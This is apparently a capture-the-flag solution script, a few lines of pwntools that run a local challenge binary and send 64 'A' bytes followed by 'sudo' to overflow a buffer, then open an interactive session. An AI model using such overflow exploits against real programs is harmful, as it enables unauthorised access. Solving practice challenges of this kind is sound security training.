from pwn import *

p = process("./dist/challenge")

p.sendline(b"A"*64 + b"sudo")

p.interactive()
